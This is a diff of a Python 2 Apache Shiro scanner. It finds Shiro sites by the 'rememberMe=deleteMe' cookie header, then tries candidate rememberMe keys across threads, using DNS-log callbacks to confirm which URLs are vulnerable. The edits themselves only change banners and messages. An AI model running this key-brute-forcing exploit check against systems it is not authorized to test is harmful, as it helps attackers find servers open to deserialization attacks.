@@ -1,4 +1,5 @@
 # -*- encoding: utf-8 -*-
+#  author : yuf1sher
 
 import os
 import re
@@ -88,6 +89,7 @@ def getdnshost():
 
 def detect(url_list):
     shiro_url_list = []
+    print "--------------------------- Detect Alive Shiro Url ----------------------------"
     for url in url_list:
         if '://' not in url:
             target = 'https://%s' % url if ':443' in url else 'http://%s' % url
@@ -101,9 +103,9 @@ def detect(url_list):
         if not headers is None:
             if 'rememberMe=deleteMe' in headers:
                 shiro_url_list.append(target)
-                print "[+] Detect Shiro url: %s." % (target)
+                print "[+] Detect Valid Shiro url: %s." % (target)
         else:
-            print "[-] Detect Valid Shiro url: %s." % (target)
+            print "[-] Detect Invalid url: %s." % (target)
     return shiro_url_list
 
 def check_vuln():
@@ -221,7 +223,7 @@ def check_vuln():
             for key_ in key:
                 random_str_ = random_str(8)
                 connect = poc(web_url,random_str_ + "." + domain,key_)
-                print "[*] Trying url:%s , key:%s. " % (web_url,key_)
+                print "[+] Trying url:%s , key:%s. " % (web_url,key_)
                 if connect == False:
                     break
                 result = getrecord()
@@ -237,11 +239,14 @@ def check_vuln():
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
-                                    description='Apache Shiro Scanner.',
-                                    usage='scan.py [optional]')
+                                    description='Shiro_Alive_keys_scan',
+                                    usage='Shiro_Alives_keys_scan.py [optional]')
     parser.add_argument('-f',metavar='File',type=str,default='url.txt',help='Put Web url in url.txt')
     parser.add_argument('-u',metavar='Url',type=str,help='Put a Web url')
     parser.add_argument('-t',metavar='THREADS',type=int,default='10',help='Num of scan threads,default 10')
+    if len(sys.argv)==1:
+        sys.argv.append('-h')
+    args = parser.parse_args()
 
     #global domain, reversehost
     global domain
@@ -249,10 +254,8 @@ if __name__ == '__main__':
     #if domain:
     #    reversehost = "http://" + domain
     #    print "[*] domain: %s. reversehost: %s." % (domain, reversehost)
+    print "--------------------------- Get Dnslog Domain ----------------------------"
     print "[*] domain: %s." % (domain)
-    if len(sys.argv)==1:
-        sys.argv.append('-h')
-    args = parser.parse_args()
     start_time = time.time()
     detect_web_url = []
     shiro_web_url = []
@@ -263,6 +266,7 @@ if __name__ == '__main__':
                 continue
             detect_web_url.append(web_url)
         shiro_web_url = detect(detect_web_url)
+        print "--------------------------- Get Shiro Url ----------------------------"
         print "[*] Detect Shiro_web_url: %s." % (shiro_web_url)
         if shiro_web_url != []:
             #将存在shiro的url放入队列
@@ -276,6 +280,7 @@ if __name__ == '__main__':
             #    queue.put(web_url)
 
             #开启多线程访问
+            print "--------------------------- Keys Scan ----------------------------"
             threads = []
             for i in range(args.t):
                 t = threading.Thread(target=check_vuln)
@@ -288,9 +293,11 @@ if __name__ == '__main__':
     else:
         queue = Queue.Queue()
         queue.put(args.u)
+        print "--------------------------- Keys Scan ----------------------------"
         check_vuln()
-    print ('[+] Done. %s weburl scanned %s available %.1f seconds.' % (scan_count,vuln_count,time.time() - start_time))
-    print "\n"
+    print "--------------------------- Result ----------------------------"
+    print ('[*] Done. %s weburl scanned %s available %.1f seconds.' % (scan_count,vuln_count,time.time() - start_time))
     for success_list in success:
-        print "[+] Vuln urls:%s, key:%s." % (success_list[0],success_list[1])
+        print "--------------------------- Vuln Shiro Url , keys ----------------------------"
+        print "[*] Vuln urls:%s, key:%s." % (success_list[0],success_list[1])
 
